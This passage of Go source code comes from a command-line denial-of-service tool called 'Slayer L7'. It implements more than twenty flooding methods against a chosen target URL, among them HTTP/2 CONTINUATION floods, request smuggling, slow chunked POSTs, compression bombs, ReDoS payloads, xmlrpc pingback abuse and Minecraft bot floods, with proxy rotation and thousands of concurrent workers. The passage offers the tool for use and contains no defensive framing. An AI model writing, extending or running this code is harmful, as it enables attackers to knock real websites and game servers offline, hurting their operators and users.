        recordStatus("Err")
        return err
    }
    req.Header.Set("User-Agent", randUA())

    var cookies strings.Builder
    for i := 0; i < 500; i++ {
        cookies.WriteString("c")
        cookies.WriteString(strconv.Itoa(i))
        cookies.WriteString("=")
        cookies.WriteString(randString(100))
        cookies.WriteString("; ")
    }
    req.Header.Set("Cookie", cookies.String())

    resp, err := client.Do(req)
    if err != nil {
        recordStatus("Err")
        return err
    }
    io.Copy(io.Discard, resp.Body)
    resp.Body.Close()
    recordStatus(strconv.Itoa(resp.StatusCode))
    return nil
}

type chunkDripReader struct {
    stop <-chan struct{}
}

func (r *chunkDripReader) Read(p []byte) (int, error) {
    select {
    case <-r.stop:
        return 0, io.EOF
    case <-time.After(time.Duration(500+rand.Intn(1500)) * time.Millisecond):
        n := copy(p, []byte(randString(10)))
        return n, nil
    }
}

func httpChunkPost(targetURL string, client *http.Client, stop <-chan struct{}) error {
    body := io.NopCloser(&chunkDripReader{stop: stop})
    req, err := http.NewRequest("POST", targetURL, body)
    if err != nil {
        recordStatus("Err")
        return err
    }
    req.ContentLength = -1
    req.Header.Set("User-Agent", randUA())
    req.Header.Set("Content-Type", "application/x-www-form-urlencoded")

    cClient := *client
    cClient.Timeout = 0
    if t, ok := cClient.Transport.(*http.Transport); ok {
        tClone := t.Clone()
        tClone.ResponseHeaderTimeout = 0
        tClone.IdleConnTimeout = 0
        cClient.Transport = tClone
    }

    resp, err := cClient.Do(req)
    if err != nil {
        recordStatus("Err")
        return err
    }
    io.Copy(io.Discard, resp.Body)
    resp.Body.Close()
    recordStatus(strconv.Itoa(resp.StatusCode))
    return nil
}

func httpMalformed(targetURL string, stop <-chan struct{}) error {
    u, err := url.Parse(targetURL)
    if err != nil {
        recordStatus("Err")
        return err
    }
    host := u.Hostname()
    port := u.Port()
    if port == "" {
        if u.Scheme == "https" {
            port = "443"
        } else {
            port = "80"
        }
    }
    addr := net.JoinHostPort(host, port)

    var rawConn net.Conn
    if len(proxyList) > 0 {
        proxy := proxyList[rand.Intn(len(proxyList))]
        pURL, err := url.Parse(proxy)
        if err != nil {
            recordStatus("Err")
            return err
        }
        rawConn, err = net.DialTimeout("tcp", pURL.Host, 5*time.Second)
        if err != nil {
            recordStatus("Err")
            return err
        }
        connectReq := "CONNECT " + addr + " HTTP/1.1\r\nHost: " + addr + "\r\n\r\n"
        if _, err := rawConn.Write([]byte(connectReq)); err != nil {
            rawConn.Close()
            recordStatus("Err")
            return err
        }
        br := bufio.NewReader(rawConn)
        resp, err := http.ReadResponse(br, nil)
        if err != nil {
            rawConn.Close()
            recordStatus("Err")
            return err
        }
        resp.Body.Close()
        if resp.StatusCode != 200 {
            rawConn.Close()
            recordStatus("ProxyErr")
            return err
        }
    } else {
        rawConn, err = net.DialTimeout("tcp", addr, 5*time.Second)
        if err != nil {
            recordStatus("Err")
            return err
        }
    }

    var conn net.Conn = rawConn
    if u.Scheme == "https" {
        tlsConn := tls.Client(rawConn, &tls.Config{ServerName: host, InsecureSkipVerify: true})
        if err := tlsConn.Handshake(); err != nil {
            rawConn.Close()
            recordStatus("Err")
            return err
        }
        conn = tlsConn
    }

    longURL := "/" + randString(8192)
    payload := fmt.Sprintf("GET %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nAccept: */*\r\n\r\n", longURL, host, randUA())
    _, err = conn.Write([]byte(payload))
    conn.Close()
    if err != nil {
        recordStatus("Err")
        return err
    }
    recordStatus("Sent")
    return nil
}

func httpH2Continuation(targetURL string, stop <-chan struct{}) error {
    u, err := url.Parse(targetURL)
    if err != nil {
        recordStatus("Err")
        return err
    }
    host := u.Hostname()
    port := u.Port()
    if port == "" {
        if u.Scheme == "https" {
            port = "443"
        } else {
            port = "80"
        }
    }
    addr := net.JoinHostPort(host, port)

    var rawConn net.Conn
    if len(proxyList) > 0 {
        proxy := proxyList[rand.Intn(len(proxyList))]
        pURL, err := url.Parse(proxy)
        if err != nil {
            recordStatus("Err")
            return err
        }
        rawConn, err = net.DialTimeout("tcp", pURL.Host, 5*time.Second)
        if err != nil {
            recordStatus("Err")
            return err
        }
        connectReq := "CONNECT " + addr + " HTTP/1.1\r\nHost: " + addr + "\r\n\r\n"
        if _, err := rawConn.Write([]byte(connectReq)); err != nil {
            rawConn.Close()
            recordStatus("Err")
            return err
        }
        br := bufio.NewReader(rawConn)
        resp, err := http.ReadResponse(br, nil)
        if err != nil {
            rawConn.Close()
            recordStatus("Err")
            return err
        }
        resp.Body.Close()
        if resp.StatusCode != 200 {
            rawConn.Close()
            recordStatus("ProxyErr")
            return err
        }
    } else {
        rawConn, err = net.DialTimeout("tcp", addr, 5*time.Second)
        if err != nil {
            recordStatus("Err")
            return err
        }
    }

    tlsConn := tls.Client(rawConn, &tls.Config{
        ServerName:         host,
        NextProtos:         []string{"h2"},
        InsecureSkipVerify: true,
    })
    if err := tlsConn.Handshake(); err != nil {
        rawConn.Close()
        recordStatus("Err")
        return err
    }
    defer tlsConn.Close()

    if tlsConn.ConnectionState().NegotiatedProtocol != "h2" {
        recordStatus("Err")
        return fmt.Errorf("h2 not negotiated")
    }

    if _, err := tlsConn.Write([]byte(http2.ClientPreface)); err != nil {
        recordStatus("Err")
        return err
    }

    bw := bufio.NewWriterSize(tlsConn, 65536)
    framer := http2.NewFramer(bw, tlsConn)
    framer.AllowIllegalWrites = true

    framer.WriteSettings(
        http2.Setting{ID: http2.SettingMaxConcurrentStreams, Val: 1000},
        http2.Setting{ID: http2.SettingInitialWindowSize, Val: 65535},
    )
    bw.Flush()

    connDone := make(chan struct{})
    go func() {
        defer close(connDone)
        for {
            f, err := framer.ReadFrame()
            if err != nil {
                return
            }
            switch sf := f.(type) {
            case *http2.SettingsFrame:
                if !sf.IsAck() {
                    framer.WriteSettingsAck()
                    bw.Flush()
                }
            case *http2.GoAwayFrame:
                return
            }
        }
    }()

    var hdrBuf bytes.Buffer
    enc := hpack.NewEncoder(&hdrBuf)
    path := u.RequestURI()
    if path == "" {
        path = "/"
    }
    scheme := u.Scheme
    if scheme == "" || scheme == "http" {
        scheme = "https"
    }
    authority := u.Host

    var streamID uint32 = 1
    junkHeaders := make([]byte, 4000)
    for i := range junkHeaders {
        junkHeaders[i] = 'A'
    }

    for {
        select {
        case <-stop:
            return nil
        case <-connDone:
            recordStatus("Err")
            return fmt.Errorf("connection closed by server")
        default:
        }

        hdrBuf.Reset()
        enc.WriteField(hpack.HeaderField{Name: ":method", Value: "GET"})
        enc.WriteField(hpack.HeaderField{Name: ":path", Value: path})
        enc.WriteField(hpack.HeaderField{Name: ":scheme", Value: scheme})
        enc.WriteField(hpack.HeaderField{Name: ":authority", Value: authority})
        enc.WriteField(hpack.HeaderField{Name: "user-agent", Value: randUA()})

        if err := framer.WriteHeaders(http2.HeadersFrameParam{
            StreamID:      streamID,
            BlockFragment: hdrBuf.Bytes(),
            EndStream:     false,
            EndHeaders:    false,
        }); err != nil {
            recordStatus("Err")
            return err
        }

        for i := 0; i < 100; i++ {
            if err := framer.WriteContinuation(streamID, false, junkHeaders); err != nil {
                recordStatus("Err")
                return err
            }
        }
        bw.Flush()

        recordStatus("Sent")
        streamID += 2

        if streamID >= 1<<31-1 {
            return nil
        }
    }
}

func httpGraphQLBatch(targetURL string, client *http.Client) error {
    fullURL := targetURL + "/api/graphql"
    var sb strings.Builder
    sb.WriteString("[")
    n := 100 + rand.Intn(500)
    for i := 0; i < n; i++ {
        if i > 0 {
            sb.WriteByte(',')
        }
        sb.WriteString(fmt.Sprintf(`{"q%d":{"query":"query { user(id: %d) { name email posts { title } } }"}}`, i, rand.Intn(9999)))
    }
    sb.WriteString("]")
    body := sb.String()

    req, err := http.NewRequest("POST", fullURL, strings.NewReader(body))
    if err != nil {
        recordStatus("Err")
        return err
    }
    req.Header.Set("Content-Type", "application/json")
    req.Header.Set("User-Agent", randUA())
    req.Header.Set("Accept", "application/json")

    resp, err := client.Do(req)
    if err != nil {
        recordStatus("Err")
        return err
    }
    io.Copy(io.Discard, resp.Body)
    resp.Body.Close()
    recordStatus(strconv.Itoa(resp.StatusCode))
    return nil
}

func httpZstdBomb(targetURL string, client *http.Client) error {
    req, err := http.NewRequest("POST", targetURL, bytes.NewReader(zstdBombPayload))
    if err != nil {
        recordStatus("Err")
        return err
    }
    req.Header.Set("Content-Type", "application/octet-stream")
    req.Header.Set("Content-Encoding", "gzip")
    req.Header.Set("Content-Length", strconv.Itoa(len(zstdBombPayload)))
    req.Header.Set("User-Agent", randUA())

    resp, err := client.Do(req)
    if err != nil {
        recordStatus("Err")
        return err
    }
    io.Copy(io.Discard, resp.Body)
    resp.Body.Close()
    recordStatus(strconv.Itoa(resp.StatusCode))
    return nil
}

func httpReDoS(targetURL string, client *http.Client) error {
    redosPayload := strings.Repeat("a", 50) + "!"
    body := fmt.Sprintf(`{"email":"%s@example.com","username":"%s"}`, redosPayload, redosPayload)
    req, err := http.NewRequest("POST", targetURL, strings.NewReader(body))
    if err != nil {
        recordStatus("Err")
        return err
    }
    req.Header.Set("Content-Type", "application/json")
    req.Header.Set("User-Agent", randUA())

    resp, err := client.Do(req)
    if err != nil {
        recordStatus("Err")
        return err
    }
    io.Copy(io.Discard, resp.Body)
    resp.Body.Close()
    recordStatus(strconv.Itoa(resp.StatusCode))
    return nil
}

func httpCachePoison(targetURL string, client *http.Client) error {
    sep := "/"
    if strings.HasSuffix(targetURL, "/") {
        sep = ""
    }
    fullURL := targetURL + sep + randString(10) + ".css"

    req, err := http.NewRequest("GET", fullURL, nil)
    if err != nil {
        recordStatus("Err")
        return err
    }
    req.Header.Set("User-Agent", randUA())
    req.Header.Set("Accept", "text/css,*/*;q=0.1")

    resp, err := client.Do(req)
    if err != nil {
        recordStatus("Err")
        return err
    }
    io.Copy(io.Discard, resp.Body)
    resp.Body.Close()
    recordStatus(strconv.Itoa(resp.StatusCode))
    return nil
}

func httpSmuggleCLTE(targetURL string, stop <-chan struct{}) error {
    u, err := url.Parse(targetURL)
    if err != nil {
        recordStatus("Err")
        return err
    }
    host := u.Hostname()
    port := u.Port()
    if port == "" {
        if u.Scheme == "https" {
            port = "443"
        } else {
            port = "80"
        }
    }
    addr := net.JoinHostPort(host, port)

    var rawConn net.Conn
    if len(proxyList) > 0 {
        proxy := proxyList[rand.Intn(len(proxyList))]
        pURL, err := url.Parse(proxy)
        if err != nil {
            recordStatus("Err")
            return err
        }
        rawConn, err = net.DialTimeout("tcp", pURL.Host, 5*time.Second)
        if err != nil {
            recordStatus("Err")
            return err
        }
        connectReq := "CONNECT " + addr + " HTTP/1.1\r\nHost: " + addr + "\r\n\r\n"
        if _, err := rawConn.Write([]byte(connectReq)); err != nil {
            rawConn.Close()
            recordStatus("Err")
            return err
        }
        br := bufio.NewReader(rawConn)
        resp, err := http.ReadResponse(br, nil)
        if err != nil {
            rawConn.Close()
            recordStatus("Err")
            return err
        }
        resp.Body.Close()
        if resp.StatusCode != 200 {
            rawConn.Close()
            recordStatus("ProxyErr")
            return err
        }
    } else {
        rawConn, err = net.DialTimeout("tcp", addr, 5*time.Second)
        if err != nil {
            recordStatus("Err")
            return err
        }
    }

    var conn net.Conn = rawConn
    if u.Scheme == "https" {
        tlsConn := tls.Client(rawConn, &tls.Config{ServerName: host, InsecureSkipVerify: true})
        if err := tlsConn.Handshake(); err != nil {
            rawConn.Close()
            recordStatus("Err")
            return err
        }
        conn = tlsConn
    }
    defer conn.Close()

    smuggledPath := "/" + randString(15)
    payload := fmt.Sprintf("POST / HTTP/1.1\r\nHost: %s\r\nContent-Length: 0\r\nTransfer-Encoding: chunked\r\nUser-Agent: %s\r\n\r\n0\r\n\r\nGET %s HTTP/1.1\r\nHost: %s\r\n\r\n", host, randUA(), smuggledPath, host)
    _, err = conn.Write([]byte(payload))
    if err != nil {
        recordStatus("Err")
        return err
    }
    recordStatus("Sent")
    return nil
}

func httpPingback(targetURL string, client *http.Client) error {
    fullURL := targetURL + "/xmlrpc.php"
    body := `<?xml version="1.0"?><methodCall><methodName>pingback.ping</methodName><params><param><value><string>` + targetURL + `/` + randString(10) + `</string></value></param><param><value><string>` + targetURL + `</string></value></param></params></methodCall>`

    req, err := http.NewRequest("POST", fullURL, strings.NewReader(body))
    if err != nil {
        recordStatus("Err")
        return err
    }
    req.Header.Set("Content-Type", "text/xml")
    req.Header.Set("User-Agent", randUA())

    resp, err := client.Do(req)
    if err != nil {
        recordStatus("Err")
        return err
    }
    io.Copy(io.Discard, resp.Body)
    resp.Body.Close()
    recordStatus(strconv.Itoa(resp.StatusCode))
    return nil
}

func mcPingFlood(targetURL string, stop <-chan struct{}) error {
    u, err := url.Parse(targetURL)
    if err != nil {
        recordStatus("Err")
        return err
    }
    host := u.Hostname()
    port := u.Port()
    if port == "" {
        port = "25565"
    }
    addr := net.JoinHostPort(host, port)

    conn, err := net.DialTimeout("tcp", addr, 5*time.Second)
    if err != nil {
        recordStatus("Err")
        return err
    }
    defer conn.Close()

    hostLen := len(host)
    handshake := []byte{0x00, 0xFF, 0xFF, 0xFF, 0x0F, 0x00, byte(hostLen)}
    handshake = append(handshake, []byte(host)...)
    portInt, _ := strconv.Atoi(port)
    portBytes := []byte{byte(portInt >> 8), byte(portInt)}
    handshake = append(handshake, portBytes...)
    handshake = append(handshake, 0x01)

    pktLen := len(handshake)
    packet := []byte{byte(pktLen)}
    packet = append(packet, handshake...)

    reqPacket := []byte{0x01, 0x00}

    _, err = conn.Write(packet)
    if err != nil {
        recordStatus("Err")
        return err
    }
    _, err = conn.Write(reqPacket)
    if err != nil {
        recordStatus("Err")
        return err
    }

    buf := make([]byte, 4096)
    conn.SetReadDeadline(time.Now().Add(2 * time.Second))
    conn.Read(buf)

    recordStatus("Sent")
    return nil
}

func mcBotJoin(targetURL string, stop <-chan struct{}) error {
    u, err := url.Parse(targetURL)
    if err != nil {
        recordStatus("Err")
        return err
    }
    host := u.Hostname()
    port := u.Port()
    if port == "" {
        port = "25565"
    }
    addr := net.JoinHostPort(host, port)

    conn, err := net.DialTimeout("tcp", addr, 5*time.Second)
    if err != nil {
        recordStatus("Err")
        return err
    }
    defer conn.Close()

    hostLen := len(host)
    handshake := []byte{0x00, 0x2F, 0x00, byte(hostLen)}
    handshake = append(handshake, []byte(host)...)
    portInt, _ := strconv.Atoi(port)
    portBytes := []byte{byte(portInt >> 8), byte(portInt)}
    handshake = append(handshake, portBytes...)
    handshake = append(handshake, 0x02)

    pktLen := len(handshake)
    packet := []byte{byte(pktLen)}
    packet = append(packet, handshake...)

    username := randString(16)
    nameLen := len(username)
    loginStart := []byte{0x00, byte(nameLen)}
    loginStart = append(loginStart, []byte(username)...)

    reqLen := len(loginStart)
    reqPacket := []byte{byte(reqLen)}
    reqPacket = append(reqPacket, loginStart...)

    conn.Write(packet)
    conn.Write(reqPacket)

    buf := make([]byte, 4096)
    conn.SetReadDeadline(time.Now().Add(5 * time.Second))
    conn.Read(buf)

    recordStatus("Sent")
    return nil
}

func Worker(id int, targetURL string, method string, clients []*http.Client, stop <-chan struct{}, verbose bool, rateMS int) {
    client := clients[id%len(clients)]
    for {
        select {
        case <-stop:
            return
        default:
        }

        var err error
        switch strings.ToLower(method) {
        case "httpget":
            err = httpGet(targetURL, client)
        case "httppost":
            err = httpPost(targetURL, client)
        case "rudy":
            err = httpRudy(targetURL, client, stop)
        case "apiflood":
            err = httpAPIFlood(targetURL, client)
        case "rapidreset":
            err = httpRapidReset(targetURL, stop)
        case "wsflood":
            err = wsFlood(targetURL, stop)
        case "slowloris":
            err = httpSlowloris(targetURL, stop)
        case "headerflood":
            err = httpHeaderFlood(targetURL, client)
        case "mixpost":
            err = httpMixPost(targetURL, client)
        case "cfbypass":
            err = httpCFBypass(targetURL, client)
        case "range":
            err = httpRangeAttack(targetURL, client)
        case "cookiebomb":
            err = httpCookieBomb(targetURL, client)
        case "chunkpost":
            err = httpChunkPost(targetURL, client, stop)
        case "malformed":
            err = httpMalformed(targetURL, stop)
        case "h2continuation":
            err = httpH2Continuation(targetURL, stop)
        case "graphql_batch":
            err = httpGraphQLBatch(targetURL, client)
        case "zstd_bomb":
            err = httpZstdBomb(targetURL, client)
        case "redos":
            err = httpReDoS(targetURL, client)
        case "cache_poison":
            err = httpCachePoison(targetURL, client)
        case "smuggle_clte":
            err = httpSmuggleCLTE(targetURL, stop)
        case "pingback":
            err = httpPingback(targetURL, client)
        case "mc_ping":
            err = mcPingFlood(targetURL, stop)
        case "mc_bot":
            err = mcBotJoin(targetURL, stop)
        default:
            fmt.Fprintf(os.Stderr, "\n  unknown method: %s\n", method)
            os.Exit(1)
        }

        if err == nil {
            totalSent.Add(1)
        }
        
        if rateMS > 0 {
            time.Sleep(time.Duration(rateMS) * time.Millisecond)
        }
    }
}

func main() {
    target := flag.String("t", "", "target URL (e.g. http://1.2.3.4)")
    method := flag.String("m", "httpget", "method: httpget, httppost, rudy, apiflood, rapidreset, wsflood, slowloris, headerflood, mixpost, cfbypass, range, cookiebomb, chunkpost, malformed, h2continuation, graphql_batch, zstd_bomb, redos, cache_poison, smuggle_clte, pingback, mc_ping, mc_bot")
    workerCount := flag.Int("w", 2048, "number of workers")
    dur := flag.Int("d", 30, "duration in seconds")
    pFile := flag.String("p", "", "proxy file path (optional, direct if omitted)")
    verbose := flag.Bool("v", false, "print request errors to stderr")
    rateDelay := flag.Int("r", 0, "delay in ms between requests per worker (0 = unlimited)")
    flag.Parse()

    if *target == "" {
        fmt.Println("Slayer L7")
        fmt.Println("\n  Usage: slayer -t <url> [-m method] [-w workers] [-d duration] [-p proxyfile]")
        fmt.Println("  Methods: httpget | httppost | rudy | apiflood | rapidreset | wsflood | slowloris | headerflood | mixpost | cfbypass | range | cookiebomb | chunkpost | malformed | h2continuation | graphql_batch | zstd_bomb | redos | cache_poison | smuggle_clte | pingback | mc_ping | mc_bot")
        fmt.Println()
        flag.PrintDefaults()
        os.Exit(1)
    }

    targetURL := *target
    workers := *workerCount
    duration := *dur
    proxyFile := *pFile

    validMethods := map[string]bool{
        "httpget": true, "httppost": true, "rudy": true, "apiflood": true, "rapidreset": true, "wsflood": true,
        "slowloris": true, "headerflood": true, "mixpost": true, "cfbypass": true, "range": true, "cookiebomb": true,
        "chunkpost": true, "malformed": true, "h2continuation": true, "graphql_batch": true, "zstd_bomb": true,
        "redos": true, "cache_poison": true, "smuggle_clte": true, "pingback": true, "mc_ping": true, "mc_bot": true,
    }
    if !validMethods[strings.ToLower(*method)] {
        fmt.Fprintf(os.Stderr, "\n  \033[31m✗\033[0m Unknown method: %s\n", *method)
        os.Exit(1)
    }

    needsClientPool := true
    switch strings.ToLower(*method) {
    case "rapidreset", "wsflood", "slowloris", "malformed", "h2continuation", "smuggle_clte", "mc_ping", "mc_bot":
        needsClientPool = false
    }

    var clients []*http.Client

    if proxyFile != "" {
        proxies, err := loadProxies(proxyFile)
        if err != nil {
            log.Fatalf("failed to load proxies: %v", err)
        }
        proxyList = proxies
        if needsClientPool {
            clients, err = buildClientPool(proxies, workers)
            if err != nil {
                log.Fatalf("failed to build client pool: %v", err)
            }
        }
    } else {
        if needsClientPool {
            poolSize := workers / 8
            if poolSize < 4 {
                poolSize = 4
            }
            if poolSize > maxDirectPool {
                poolSize = maxDirectPool
            }
            clients = buildDirectPool(poolSize)
        }
    }

    if clients == nil {
        clients = []*http.Client{{}}
    }

    stop := make(chan struct{})
    for i := 0; i < workers; i++ {
        go Worker(i, targetURL, *method, clients, stop, *verbose, *rateDelay)
    }

    ticker := time.NewTicker(100 * time.Millisecond)
    defer ticker.Stop()

    for {
        select {
        case <-time.After(time.Duration(duration) * time.Second):
            close(stop)
            drawUI(targetURL, *method, proxyFile, workers, duration)
            fmt.Println("\n  \033[1m\033[31mATTACK COMPLETE\033[0m")
            os.Exit(0)
        case <-ticker.C:
            drawUI(targetURL, *method, proxyFile, workers, duration)
        }
    }
}
